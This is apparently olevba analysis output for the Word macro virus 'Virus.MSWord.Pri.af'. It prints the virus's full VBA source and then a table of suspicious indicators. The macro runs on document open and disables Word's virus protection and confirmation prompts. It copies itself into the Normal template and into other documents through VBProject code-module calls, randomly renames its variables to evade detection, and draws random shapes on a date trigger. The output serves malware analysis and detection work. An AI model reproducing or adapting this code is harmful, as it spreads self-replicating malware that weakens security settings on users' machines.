olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.af-f302c7b9f676cfe210f714893505f1424ec34fc6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.af-f302c7b9f676cfe210f714893505f1424ec34fc6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
OU9956 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EB2017 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set RH6817 = ActiveDocument.VBProject.VBComponents.Item(1)
SB8163 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set RH6817 = NormalTemplate.VBProject.VBComponents.Item(1)
AN8159 = True
Call TO7851_UT3737
ActiveDocument.Saved = True
End If
If AN8159 <> True And SB8163 <> True Then GoTo MN6729
If AN8159 = True Then RH6817.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OU9956 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If SB8163 = True Then RH6817.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EB2017 - 3))
MN6729:
If EB2017 <> 0 And OU9956 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function TO7851_UT3737()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "QJ7798": r1(2) = "IC4425": r1(3) = "VF3381": r1(4) = "SJ7949": r1(5) = "UT3737": r1(6) = "OU9956"
r1(7) = "EB2017": r1(8) = "SB8163":: r1(9) = "RH6817": r1(10) = "AN8159": r1(11) = "MN6729": r1(12) = "TO7851": r1(13) = "RN5589": r1(14) = "UO3118"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call UT3737(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function UT3737(UO3118, RN5589 As String)
On Error Resume Next
Dim QJ7798 As Long: Dim IC4425 As Long: Dim VF3381 As Long: Dim SJ7949 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
QJ7798 = 1: IC4425 = 1: VF3381 = .CountOfLines: SJ7949 = Len(.Lines(.CountOfLines, 1))
Do While .Find(RN5589, QJ7798, IC4425, VF3381, SJ7949, True)
strline = .Lines(QJ7798, 1)
strline = Left(strline, IC4425 - 1) & UO3118 & Mid(strline, SJ7949)
.replaceline QJ7798, strline
QJ7798 = VF3381 + 1: IC4425 = 1:
VF3381 = .CountOfLines
SJ7949 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

